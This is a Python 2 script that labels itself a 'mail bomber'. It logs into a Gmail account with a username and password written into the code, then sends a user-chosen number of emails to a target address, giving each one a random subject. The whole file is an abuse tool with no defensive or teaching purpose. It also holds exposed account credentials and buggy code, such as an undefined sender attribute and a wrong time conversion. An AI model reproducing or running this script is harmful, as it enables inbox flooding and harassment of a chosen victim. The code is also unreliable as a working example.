import smtplib  #for SMTP Protocol 
import mimetypes #converts URL
import sys #for System
import time #time
import random as r

def subjecter():
	main = []
	characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890$@^`,|%;.~()/{}:?[]=\-+_#!"

	for character in characters:
		main.append(character)
	password = []

	for i in range(100):
		password.append(r.choice(main))
	return ''.join(password)


def stopWatch(value):
	'''From seconds to Days;Hours:Minutes;Seconds'''

	valueD = (((value/365)/24)/60)
	Days = int (valueD)

	valueH = (valueD-Days)*365
	Hours = int(valueH)

	valueM = (valueH - Hours)*24
	Minutes = int(valueM)

	valueS = (valueM - Minutes)*60
	Seconds = int(valueS)


	print "Time taken is :",Days,"days",Hours,"hours",Minutes,"minutes",Seconds,"seconds"

	
from email.MIMEText import MIMEText
class SMTP(object):
	def title(self):print "       PYTHON MAIL BOMBER IS WORKING    "
 
	def SMTPconnect(self):
			print "We are in the SMTPconnect" #list of SMTP server - http://www.e-eeasy.com/SMTPServerList.aspx
			self.smtpserver="smtp.gmail.com"
			self.smtpport=465
			try:
				self.mailServer = smtplib.SMTP(self.smtpserver,self.smtpport)
			except IOError, e:
				print "COULD NOT MAKE SMTP SERVER"
				print 'Error: %s' %(e)
				time.sleep(5)
				sys.exit(1)
			self.mailServer.starttls()
			self.username="aniprak123@gmail.com"
			self.password="qwerty1234567890"
			try:
				self.mailServer.login(self.username,self.password)
			except BaseException, e:
				print "COULD NOT SIGN IN"
				print 'Error: %s' % (e)
				time.sleep(3)
				sys.exit(1)
	def buildemail(self):
			print " We are inside Buildemail "
			print "\tBuilding message part"
			self.To = raw_input("\nTo: ") # TO
			self.Message = raw_input("\nMessage: ") #message
			mensaje = MIMEText(self.Message)
			mensaje['From']="aniprak123@gmail.com"
			mensaje['To']=self.To
			self.ammount = input("How many times would you like to send email: ")
			x = 0
			start = time.time()
			while x < self.ammount:
				self.Subject = subjecter()
				mensaje['Subject']=self.Subject
				self.mailServer.sendmail(self.From, self.To, mensaje.as_string())
				x+=1
				print "Sent",x,"mails"
			
			end = time.time()
			print "Sent %d messages to %s" %(self.ammount,self.To)
			stopWatch(end-start)
			
if __name__ == '__main__':
	s = SMTP()
	s.title()
	s.SMTPconnect()
	s.buildemail()